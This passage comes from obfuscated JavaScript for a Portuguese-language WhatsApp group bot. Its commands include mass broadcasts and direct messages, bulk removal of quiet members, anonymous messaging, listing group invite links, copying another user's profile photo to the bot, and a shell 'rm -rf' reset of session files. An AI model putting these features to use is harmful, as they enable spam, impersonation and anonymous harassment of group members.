              var _0x533342 = _0x101cab && !_0x843d9b && !_0x15d9f3 && !_0x47b60a && !_0x37575f && !_0x417249 && !_0x25e12d ? "Transmissão Do Dono: " + _0x2002e6.conversation : _0xd2050d.message?.["conversation"];
              var _0x130462 = _0x2e48e2 && !_0x843d9b && !_0x15d9f3 && !_0x533342 && !_0x47b60a && !_0x37575f && !_0x417249 && !_0x25e12d ? "Transmissão Do Dono: " + _0x2002e6.extendedTextMessage?.["text"] : _0xd2050d?.["message"]?.["extendedTextMessage"]?.["text"];
              if (_0x47b60a) {
                _0x176a38 = _0x47b60a;
                _0x47b60a.caption = _0x11e99e.length > 1 ? "Transmissão Do Dono: " + _0x11e99e : _0x47b60a.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                _0x47b60a.image = {
                  'url': _0x47b60a.url
                };
              } else {
                if (_0x37575f) {
                  _0x176a38 = _0x37575f;
                  _0x37575f.caption = _0x11e99e.length > 1 ? "Transmissão Do Dono: " + _0x11e99e : _0x37575f.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                  _0x37575f.video = {
                    'url': _0x37575f.url
                  };
                } else {
                  if (_0x533342) {
                    black = {};
                    black.text = _0x533342.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                    _0x176a38 = black;
                  } else {
                    if (!_0x843d9b && !_0x15d9f3 && _0x130462) {
                      brown = {};
                      brown.text = _0x130462.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                      _0x176a38 = brown;
                    } else {
                      if (_0x417249) {
                        _0x176a38 = _0x417249;
                        _0x417249.document = {
                          'url': _0x417249.url
                        };
                      } else {
                        if (_0x25e12d) {
                          _0x176a38 = _0x25e12d;
                          _0x25e12d.caption = _0x11e99e.length > 1 ? "Transmissão Do Dono: " + _0x11e99e : _0x25e12d.caption.replace(new RegExp(_0x141936 + _0x267d4b, 'gi'), "TRANSMISSÃO DO DONO: " + NickDono + "\n\n");
                          _0x25e12d.document = {
                            'url': _0x25e12d.url
                          };
                        } else {
                          if (_0x15d9f3) {
                            _0x176a38 = _0x15d9f3;
                            _0x15d9f3.sticker = {
                              'url': _0x15d9f3.url
                            };
                          } else {
                            if (_0x843d9b) {
                              _0x176a38 = _0x843d9b;
                              _0x843d9b.audio = {
                                'url': _0x843d9b.url
                              };
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
              for (_0x3194f3 = 0; _0x3194f3 < rgp.length; _0x3194f3++) {
                _0x5196be.sendMessage(rgp[_0x3194f3].id, _0x176a38);
              }
              break;
            case "reviverqr":
              {
                if (!_0xf59944 && !_0x3eefd0) {
                  return _0x50740b("Este comando só o bot ou o dono pode executar.");
                }
                const _0x3f70f4 = {
                  maxBuffer: 10485760
                };
                exec("cd DADOS/ESDEATH-QR && rm -rf pre-key* sender* session*", _0x3f70f4, (_0x3d9848, _0x31f9dd) => {
                  if (_0x3d9848) {
                    console.error("Erro durante o processo de exclusão:", _0x3d9848);
                    _0x50740b("ERRO!! Falha ao excluir arquivos. Detalhes do erro: " + _0x3d9848.message);
                  } else {
                    _0x50740b("Reiniciando..");
                    setTimeout(() => {
                      process.exit();
                    }, 10000);
                  }
                });
              }
              break;
            case "reviver":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0xf59944) {
                return _0x50740b("Comando Desativado pelo dono...");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0xd2050d.message.extendedTextMessage === undefined || _0xd2050d.message.extendedTextMessage === null) {
                return _0x50740b("Marque uma mensagem do alvo!");
              }
              sleep(5000);
              response2 = await _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x42d32c], "add");
              _0x50740b("Usuario Adicionado de volta ao grupo.");
              break;
            case "seradm":
              if (!_0xf59944 && !_0x3eefd0) {
                return _0x50740b("Só dono pode executar este comando.");
              }
              _0x1106fd('@' + _0x45b1c6 + " Pronto - Agora você é um administrador..", [_0x246d48], true);
              _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "promote");
              break;
            case "sermembro":
              if (!_0xf59944 && !_0x3eefd0) {
                return _0x50740b("Só dono pode executar este comando.");
              }
              _0x1106fd('@' + _0x45b1c6 + " Pronto - Agora você é um membro comum novamente..", [_0x246d48], true);
              _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "demote");
              break;
            case "apresentar":
            case "apr":
              inff = "Bem vindo(a) ao grupo : " + _0x3baffe + "\n\n\n👾 •𝑬𝑵𝑻𝑹𝑶𝑼 𝑺𝑬 𝑨𝑷𝑹𝑬𝑺𝑬𝑵𝑻𝑨•\n📸 •F𝜣T𝜣\n👻 •N𝜣ME\n📌 •CID∆DE\n🗓️ •ID∆DE\n⚠️ •LEI∆ ∆S REGR∆S D𝜣 GRUP𝜣\n\n*APROVEITE O GRUPO!*";
              const _0x239836 = {
                text: inff
              };
              const _0x4a12df = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x239836, _0x4a12df);
              break;
            case "papof":
            case "regraspp":
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              txtz = "【᯽𒋨📷:𝑆𝑒 𝑎𝑝𝑟𝑒𝑠𝑒𝑛𝑡𝑒𝑚 𝑙𝑖𝑥𝑜𝑠🌚»°】\n𒋨·࣭࣪̇🔥ɴᴏᴍᴇ:\n𒋨·࣭࣪̇🔥ɪᴅᴀᴅᴇ:\n𒋨·࣭࣪̇🔥ʀᴀʙᴀ:\n*Aᴘʀᴇsᴇɴᴛᴇ-sᴇ sᴇ ǫᴜɪsᴇʀ.*\n𝙏𝘼𝙂𝙎➭᜔ׂ࠭ ⁸₈⁸|𝟖𝟖𝟖|𝟠𝟠𝟠| ེི⁸⁸⁸\n ──╌╌╌┈⊰★⊱┈╌╌╌┈─\n❌ ENTROU NO \nGRUPO INTERAJA, NÃO PRECISAMOS DE ENFEITES,INATIVOS SERAO REMOVIDOS ❌* \n\n/﹋<,︻╦╤─ ҉ - -----💥 \n/﹋ 🅴 🅱🅴🅼 🆅🅸🅽🅳🅾 🆂🅴🆄🆂 🅵🅸🅻🅷🅾🆂 🅳🅰 🅿🆄🆃🅰";
              const _0x519ddd = {
                text: txtz
              };
              const _0x4762f4 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x519ddd, _0x4762f4);
              break;
            case "digt":
              _0xf9c182 = "🔥↯𝐉𝐀 𝐄𝐍𝐓𝐑𝐀 𝐃𝐈𝐆𝐈𝐓𝐀𝐍𝐃𝐎 𝚽𝐈 ↯°🌚💕\n           ི⋮ ྀ🌴⏝ ི⋮ ྀ🚸 ི⋮ ྀ⏝🌴 ི⋮ ྀ \n\n🐼🍧↯𝖠𝖰𝖴𝖨 𝖵𝖮𝖢𝖤̂ 𝖯𝖮𝖣𝖤 𝖲𝖤𝖱↯🍧🐻\nㅤㅤㅤㅤ  ◍۫❀⃘࣭࣭࣭࣭ٜꔷ⃔໑࣭࣭ٜ⟅◌ٜ🛸◌⟆࣭࣭ٜ໑⃕ꔷ⃘࣭࣭࣭࣭ٜ❀۫◍ི࣭࣭࣭࣭ ུ\n    【✔】ᴘʀᴇᴛᴀ👩🏾‍🦱 【✔】ʙʀᴀɴᴄᴀ👩🏼\n    【✔】ᴍᴀɢʀᴀ🍧【✔】ɢᴏʀᴅᴀ🍿\n    【✔】ᴘᴏʙʀᴇ🪙 【✔】ʀɪᴄᴀ💳\n    【✔】ʙᴀɪᴀɴᴀ💌【✔】ᴍᴀᴄᴏɴʜᴇɪʀᴀ🍁\n    【✔】ᴏᴛᴀᴋᴜ🧧【✔】ᴇ-ɢɪʀʟ🦄\n    【✔】ʟᴏʟɪ🍭    【✔】ɢᴀᴅᴏ🐃\n    【✔】ɢᴀʏ🏳️‍🌈     【✔】ʟᴇsʙɪᴄᴀ✂️\n    【✔】ᴠᴀᴅɪᴀ💄  【✔】ᴛʀᴀᴠᴇᴄᴏ🍌\n                【✔】ɴɪɴɢᴜᴇᴍ ʟɪɢᴀ📵\n. ☪︎ • ☁︎. . •.\n【 𝐕𝐄𝐌 𝐆𝐀𝐋𝐄𝐑𝐀, 𝐒𝐄 𝐃𝐈𝐕𝐄𝐑𝐓𝐈𝐑 𝐄 𝐅𝐀𝐙𝐄𝐑 𝐏𝐀𝐑𝐓𝐄 𝐃𝐀 𝐅𝐀𝐌𝐈𝐋𝐈𝐀.】🥂";
              const _0x3ad78e = {
                text: _0xf9c182
              };
              const _0x33dafe = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x3ad78e, _0x33dafe);
              break;
            case "sairdogp":
              {
                if (!_0xf59944) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Você deve visualizar o comando " + _0x141936 + "listagp e olhar de qual o grupo quer sair, e veja a numeração dele, e só digitar\nExemplo: " + _0x141936 + "sairdogp 0\nesse comando é para o bot sair do grupo que deseja..");
                }
                let _0x10a8e0 = await _0x5196be.groupFetchAllParticipating();
                var _0x32d8bd = Object.entries(_0x10a8e0).slice(0).map(_0x3b4c4c => _0x3b4c4c[1]);
                var _0x12914f = _0x32d8bd.map(_0xee06f9 => _0xee06f9);
                _0x12914f.sort((_0x4fc869, _0x312874) => _0x4fc869[0] < _0x312874.length);
                try {
                  const _0x844863 = {
                    text: "Irei sair do grupo, por ordem do meu dono, se quiserem alugar o bot por um preço bacana, chega no privado: https://wa.me/558198923680"
                  };
                  _0x5196be.sendMessage(_0x12914f[_0x11e99e].id, _0x844863);
                  setTimeout(() => {
                    _0x5196be.groupLeave(_0x12914f[_0x11e99e].id);
                  }, 5000);
                } catch (_0x4d0831) {
                  _0x50740b(String(_0x4d0831));
                }
                _0x50740b("Pronto meu dono, sair do grupo que você queria, em caso de dúvidas acione o comando listagp pra verificar..");
              }
              break;
            case "listagp":
              {
                if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("```SOMENTE MEU DONO LINDÃO```");
                }
                let _0x1a594d;
                let _0x5bea94 = await _0x5196be.groupFetchAllParticipating();
                var _0x32d8bd = Object.entries(_0x5bea94).slice(0).map(_0x2741c7 => _0x2741c7[1]);
                var _0x12914f = _0x32d8bd.map(_0x26e360 => _0x26e360);
                _0x12914f.sort((_0x3245af, _0x46792a) => _0x3245af[0] < _0x46792a.length);
                teks1 = "*LISTA DE GRUPOS*\n*Total de Grupos* : " + _0x12914f.length + "\n\n";
                for (let _0x325542 = 0; _0x325542 < _0x12914f.length; _0x325542++) {
                  try {
                    _0x1a594d = await _0x5196be.groupInviteCode(_0x12914f[_0x325542].id);
                  } catch {
                    _0x1a594d = "Não foi possivel puxar.";
                  }
                  var _0xd85647 = _0x12914f[_0x325542].isCommunity;
                  teks1 += (_0xd85647 ? "• *Comunidade*" : "• *Grupo*") + "• *Grupo* : " + _0x325542 + "\n• É uma comunidade ? " + (_0xd85647 ? "Sim" : "Não") + "\n" + (_0xd85647 ? '' : "• Link Do Grupo: https://chat.whatsapp.com/" + _0x1a594d + "\n") + "• *Nome do Grupo* : " + _0x12914f[_0x325542].subject + "\n• *Id do Grupo* : " + _0x12914f[_0x325542].id + "\n• *Criado* : " + moment(('' + _0x12914f[_0x325542].creation) * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss") + "\n" + (_0xd85647 ? '' : "• *Total de Membros* : " + _0x12914f[_0x325542].participants.length + "\n") + "\n" + '-'.repeat(25) + "\n\n";
                }
                _0x50740b(teks1);
              }
              break;
            case "listagp3":
              {
                if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("```SOMENTE MEU DONO LINDÃO```");
                }
                let _0x2d2a96 = await _0x5196be.groupFetchAllParticipating();
                let _0x2d1c77 = Object.entries(_0x2d2a96).slice(0).map(_0x191faa => _0x191faa[1]);
                let _0x407c74 = _0x2d1c77.filter(_0x83913f => !_0x83913f.isCommunity);
                _0x407c74.sort((_0x5421cf, _0x2a46fd) => _0x5421cf[0] < _0x2a46fd.length);
                teks1 = "*LISTA DE GRUPOS*\n*Total de Grupos* : " + _0x407c74.length + "\n\n";
                for (let _0xdefbb3 = 0; _0xdefbb3 < _0x407c74.length; _0xdefbb3++) {
                  teks1 += "• *Grupo* : " + _0xdefbb3 + "\n• *Nome do Grupo* : " + _0x407c74[_0xdefbb3].subject + "\n• *Id do Grupo* : " + _0x407c74[_0xdefbb3].id + "\n• *Criado* : " + moment(('' + _0x407c74[_0xdefbb3].creation) * 1000).tz("America/Sao_Paulo").format("DD/MM/YYYY HH:mm:ss") + "\n• *Total de Membros* : " + _0x407c74[_0xdefbb3].participants.length + "\n\n";
                }
                _0x50740b(teks1);
              }
              break;
            case "atividade":
            case "atividades":
              try {
                if (!_0x3f2f63 && !issupre && !ischyt) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (_0x89cd51 && JSON.stringify(countMessage).includes(_0x346d97)) {
                  var _0x2c40cb = countMessage.map(_0x904e65 => _0x904e65.groupId).indexOf(_0x346d97);
                  if (countMessage[_0x2c40cb].numbers.length == 0) {
                    return;
                  }
                  teks = "*Atividade dos membros do grupo:*\n\n";
                  for (_0x3194f3 = 0; _0x3194f3 < countMessage[_0x2c40cb].numbers.length; _0x3194f3++) {
                    var _0xb3787a = countMessage[_0x2c40cb].numbers.map(_0x602a2f => _0x602a2f.id).indexOf(countMessage[_0x2c40cb].numbers[_0x3194f3].id);
                    var _0x3d59a1 = countMessage[_0x2c40cb].numbers[_0x3194f3];
                    teks += "*• Membro:* @" + _0x3d59a1.id.split('@')[0] + "\n*• Comandos:* " + _0x3d59a1.cmd_messages + "*\n*• Mensagens:* " + _0x3d59a1.messages + "*\n*• Aparelho:* " + _0x3d59a1.aparelho + "*\n\n----------------------------------\n\n";
                  }
                  _0x5dcc57(teks);
                } else {
                  return _0x50740b("*Nada foi encontrado*");
                }
              } catch (_0x33fce3) {
                console.log(_0x33fce3);
              }
              break;
            case "inativos":
            case "inativo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x11e99e.match(/[a-z]/i) || !_0x11e99e) {
                return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " 0\nIsso mostrará quantas pessoas tem 0 mensagens no grupo, e se usar 5, vai mostrar quantos usuários tem 5 mensagens ou menos..");
              }
              await _0xc7d21a();
              var _0xb83e05 = countMessage?.["map"](_0x1d1e93 => _0x1d1e93.groupId)?.["indexOf"](_0x346d97);
              _0x37575f = [];
              let _0x51b7ec = countMessage[_0xb83e05].numbers.map(_0x43d575 => _0x43d575.id);
              for (_0x3194f3 of countMessage[_0xb83e05].numbers) {
                if (_0x3194f3.messages <= Number(_0x11e99e.trim()) && _0x3194f3.figus <= Number(_0x11e99e.trim()) && _0x3194f3.cmd_messages <= Number(_0x11e99e.trim()) && _0x3194f3.id != _0x517366 && groupMembers.map(_0x5882ca => _0x5882ca.id).includes(_0x3194f3.id)) {
                  const _0x27b394 = {
                    id: _0x3194f3.id,
                    messages: _0x3194f3.messages
                  };
                  _0x37575f.push(_0x27b394);
                }
              }
              for (let _0x3f4069 of groupMembers) {
                if (!_0x51b7ec.includes(_0x3f4069.id) && _0x3f4069.id != _0x517366) {
                  const _0x4f1865 = {
                    id: _0x3f4069.id,
                    messages: 0x0
                  };
                  _0x37575f.push(_0x4f1865);
                }
              }
              if (_0x37575f.length == 0) {
                return _0x50740b("Não tem pessoas com " + _0x11e99e.trim() + " mensagem(ns)..");
              }
              bli = "Usuários com " + _0x11e99e.trim() + " mensagem(ns) pra baixo..\n\n";
              for (ac = 0; ac < _0x37575f.length; ac++) {
                bli += ac + 1 + " - _ Usuário: @" + _0x37575f[ac].id.split('@')[0] + " - " + _0x37575f[ac].messages + " mensagem(ns)\n\n";
              }
              _0x5dcc57(bli);
              break;
            case "banghost":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x11e99e.match(/[a-z]/i) || !_0x11e99e || _0x11e99e.length > 3) {
                return _0x50740b("Digite a partir de quantas mensagens pra baixo você deseja remover (que não interaje no grupo).\nExemplo: " + (_0x141936 + _0x267d4b) + " 0");
              }
              var _0xb83e05 = countMessage?.["map"](_0x9cf1f8 => _0x9cf1f8.groupId)?.["indexOf"](_0x346d97);
              _0x37575f = [];
              for (_0x3194f3 of countMessage[_0xb83e05].numbers) {
                if (_0x3194f3.messages <= Number(_0x11e99e.trim())) {
                  if (_0x3194f3.figus <= Number(_0x11e99e.trim())) {
                    if (_0x3194f3.cmd_messages <= Number(_0x11e99e.trim())) {
                      if (!_0x1c25a7.includes(_0x3194f3.id)) {
                        if (!_0x5bd5f4.includes(_0x3194f3.id)) {
                          if (_0x3194f3.id != _0x517366) {
                            if (groupMembers.map(_0x1283ac => _0x1283ac.id).includes(_0x3194f3.id)) {
                              _0x37575f.push(_0x3194f3.id);
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
              for (_0x3194f3 of countMessage[_0xb83e05].numbers) {
                if (!groupMembers.map(_0x5d5584 => _0x5d5584.id).includes(_0x3194f3.id)) {
                  if (_0x3194f3.id.length > 5) {
                    _0x37575f.push(_0x3194f3.id);
                  }
                }
              }
              for (let _0x31d7f9 of groupMembers) {
                if (!countMessage[_0xb83e05].numbers.map(_0x1ddb8b => _0x1ddb8b.id).includes(_0x31d7f9.id) && _0x31d7f9.id != _0x517366) {
                  _0x37575f.push(_0x31d7f9.id);
                }
              }
              if (_0x37575f.length == 0) {
                return _0x50740b("Não tem mais pessoas com " + _0x11e99e.trim() + " mensagem(ns) para eu remover..");
              }
              for (_0x3194f3 = 0; _0x3194f3 < _0x37575f.length; _0x3194f3++) {
                await sleep(1000);
                _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x37575f[_0x3194f3]], "remove");
              }
              break;
            case "correio":
              {
                if (!_0x11e99e.trim().includes('/')) {
                  return _0x50740b("Exemplo: " + _0x141936 + "correio 558198923680/Oi Amor, sdds");
                }
                let [_0xedaaa5, _0x24b0c4] = _0x11e99e.trim().split('/');
                _0xf9c182 = "╭┄━┄━┄━┄━┄━╮\n┞┧ ⸙. ͎۪۫          💌  ː͡₊ꞋꞌꞋꞌ\n┞┧Correio anônimo. \n┞┧Msg: " + _0x24b0c4 + "\n┞┧\n╰┄━┄━┄━┄━┄━╮";
                const _0x48cc88 = {
                  text: _0xf9c182
                };
                _0x5196be.sendMessage(_0xedaaa5 + "@s.whatsapp.net", _0x48cc88);
                _0x50740b("Mensagem enviada com sucesso para o usuário: " + _0xedaaa5);
              }
              break;
            case "nome-bot":
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              NomeDoBot = _0x11e99e.trim();
              setting.NomeDoBot = _0x11e99e.trim();
              fs.writeFileSync("./DADOS/settings.json", JSON.stringify(setting, null, 2));
              _0x50740b("O nome do seu bot foi alterado com sucesso para : " + _0x11e99e);
              break;
            case "nick-dono":
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              setting.NickDono = _0x11e99e.trim();
              NickDono = setting.NickDono;
              fs.writeFileSync("./DADOS/settings.json", JSON.stringify(setting, null, 2));
              _0x50740b("O Nick Do Dono foi configurado para : " + _0x11e99e);
              break;
            case "numero-dono":
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (_0x11e99e.match(/[a-z]/i)) {
                return _0x50740b("É apenas números..");
              }
              _0x50740b("O número dono foi configurado com sucesso para : " + _0x11e99e);
              setting.numerodono = _0x11e99e.trim().replace(new RegExp("[()+-/ +/]", 'gi'), '');
              _0x5bd5f4[0] = setting.numerodono;
              numerodn = setting.numerodono;
              numerodono_ofc = setting.numerodono;
              fs.writeFileSync("./DADOS/settings.json", JSON.stringify(setting, null, 2));
              break;
            case "prefixo-bot":
            case "setprefix":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              setede = _0x11e99e.replace(/[0-9a-zA-z]/g, '');
              setede2 = setede.charAt(0);
              if (!setede2) {
                return _0x50740b("Aviso: o resultado do prefixo está vazio. Certifique-se de incluir caracteres válidos.");
              }
              setting.prefix = setede2;
              fs.writeFileSync("./DADOS/settings.json", JSON.stringify(setting, null, 2));
              _0x50740b("O prefixo foi alterado com sucesso para: " + setting.prefix);
              break;
            case "setprefixs":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              _0x141936 = _0x23d865[0];
              setting.prefix = _0x141936;
              fs.writeFileSync("./DADOS/settings.json", JSON.stringify(setting, null, 2));
              _0x50740b("O prefixo foi alterado com sucesso para: " + _0x141936);
              break;
            case "nomegp":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              _0x5196be.groupUpdateSubject(_0x346d97, '' + _0x3ac611.slice(9));
              const _0x43487c = {
                text: "Sucesso, alterou o nome do grupo"
              };
              const _0x5c77b3 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x43487c, _0x5c77b3);
              break;
            case "fotobot":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x54198a) {
                return _0x50740b("Envie fotos com legendas " + _0x141936 + "fotobot ou tags de imagem que já foram enviadas");
              }
              buff = await getFileBuffer(_0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, "image");
              _0x5196be.updateProfilePicture(_0x517366, buff);
              _0x50740b("Obrigado pelo novo perfil😗");
              break;
            case "clonar":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Você quem é o proprietário?");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Marque a pessoa que você quer clonar\n\n*EXEMPLO:* clone @");
              }
              if (!_0xd79836[0] || _0xd79836[1]) {
                return _0x50740b("Marque o @ do usuário para roubar a foto do perfil dele, para a do bot..");
              }
              let {
                jid: _0x4a5c7b,
                id: _0x17bddb,
                notify: _0x5559bc
              } = groupMembers.find(_0x45a0b9 => _0x45a0b9.id === _0xd79836[0]);
              try {
                pp = await _0x5196be.profilePictureUrl(_0x17bddb);
                _0x926ec9 = await getBuffer(pp);
                _0x5196be.updateProfilePicture(_0x517366, _0x926ec9);
                _0x1106fd("Foto do perfil atualizada com sucesso, usando a foto do perfil @" + _0x17bddb.split('@')[0], [_0x17bddb], true);
              } catch (_0x2829b9) {
                _0x50740b("Putz, deu erro, a pessoa deve estar sem foto 😔");
              }
              break;
            case "envmsg":
              if (!_0xf59944 && !_0x3eefd0) {
                return;
              }
              var [_0x5182bc, _0x511996] = _0x11e99e.split('/');
              const _0x361332 = {
                text: _0x511996
              };
              _0x5196be.sendMessage(_0x5182bc, _0x361332);
              break;
            case "bcgp":
            case "bcgc":
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Cade o texto?");
              }
              var _0x2d63f4 = _0xd2050d.participant;
              if (_0x39e519 && !_0xd2050d.message.videoMessage || _0x54198a) {
                encmedia = await getFileBuffer(_0xd2050d.message.extendedTextMessage.contextInfo.quotedMessage.imageMessage, "image");
                for (_0x3194f3 = 0; _0x3194f3 < groupMembers.length; _0x3194f3++) {
                  await sleep(2000);
                  const _0x41665d = {
                    image: buff
                  };
                  _0x5196be.sendMessage(groupMembers[_0x3194f3].id, _0x41665d, {
                    'caption': "*「 TRANSMISSÃO 」*\n\nGrupo: " + _0x3baffe + "\n Número: wa.me/" + _0x246d48.split('@')[0] + "\nMensagem : " + _0x3ac611.slice(6)
                  });
                }
                _0x50740b("Transmissão enviada..");
              } else {
                for (_0x3194f3 = 0; _0x3194f3 < groupMembers.length; _0x3194f3++) {
                  await sleep(2000);
                  _0x26c240(groupMembers[_0x3194f3].id, "*「 TRANSMISSÃO 」*\n\nGrupo : " + _0x3baffe + "\n Número : wa.me/" + _0x246d48.split('@')[0] + "\nMensagem : " + _0x3ac611.slice(6));
                }
                _0x50740b("Grupo de transmissão bem-sucedido");
              }
              break;
            case "dono1":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.dono1 = _0x11e99e.trim().replaceAll('@', '');
              dono1 = nescessario.dono1;
              _0x13c255(nescessario);
              _0x50740b("Agora contem um segundo dono(a) alterado com sucesso para: " + _0x11e99e);
              break;
            case "dono2":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.dono2 = _0x11e99e.trim().replaceAll('@', '');
              dono2 = nescessario.dono2;
              _0x13c255(nescessario);
              _0x50740b("Agora contem um segundo dono(a) alterado com sucesso para: " + dono2);
              break;
            case "dono3":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.dono3 = _0x11e99e.trim().replaceAll('@', '');
              dono3 = nescessario.dono3;
              _0x13c255(nescessario);
              _0x50740b("Agora contem um terceiro dono(a) alterado com sucesso para: " + dono3);
              break;
            case "dono4":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.dono4 = _0x11e99e.trim().replaceAll('@', '');
              dono4 = nescessario.dono4;
              _0x13c255(nescessario);
              _0x50740b("Agora contem um quarto dono(a) alterado com sucesso para: " + dono4);
              break;
            case "dono5":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.dono5 = _0x11e99e.trim().replaceAll('@', '');
              dono5 = nescessario.dono5;
              _0x13c255(nescessario);
              _0x50740b("Agora contem um quinto dono(a) alterado com sucesso para: " + dono5);
              break;
            case "dono6":
              if (_0x23d865.length < 1) {
                return;
              }
              if (!_0xf59944 && !_0x3eefd0 && !issupre && !ischyt) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              nescessario.dono6 = _0x11e99e.trim().replaceAll('@', '');
              dono6 = nescessario.dono6;
              _0x13c255(nescessario);
              _0x50740b("Agora contem um quinto dono(a) alterado com sucesso para: " + dono6);
              break;
            case "getquoted":
              _0x50740b(JSON.stringify(_0xd2050d.message.extendedTextMessage.contextInfo, null, 3));
              break;
            case "donos":
              p = "[ Lista de donos do bot " + NomeDoBot + " ] \n\nDono Oficial do bot: " + numerodono_ofc + "\n\n- [ 1 ] " + dono1 + "\n- [ 2 ] " + dono2 + "\n- [ 3 ] " + dono3 + "\n- [ 4 ] " + dono4 + "\n- [ 5 ] " + dono5 + "\n- [ 6 ] " + dono6;
              _0x50740b(p);
              break;
            case "admins":
            case "listadmins":
            case "listaadmins":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              ytb = "Lista de admins do grupo *" + _0x3071b5.subject + "*\nTotal : " + _0x1c25a7.length + "\n\n";
              no = 0;
              for (let _0x189324 of _0x1c25a7) {
                no += 1;
                ytb += '[' + no.toString() + "] @" + _0x189324.split('@')[0] + "\n";
              }
              _0x1106fd(ytb, _0x1c25a7, true);
              break;
            case "criartabela":
            case "criartbl":
            case "criartab":
              if (!_0x3f2f63 && !_0xf59944) {
                return _0x50740b("Só adm ou dono pode utilizar este comando.");
              }
              if (!_0x11e99e.trim()) {
                return _0x50740b("Digite o que deseja colocar na tabela do grupo..");
              }
              msgz = _0x23d865.join(" ");
              msgtmpol = moment.tz("America/Sao_Paulo").format("HH:mm:ss");
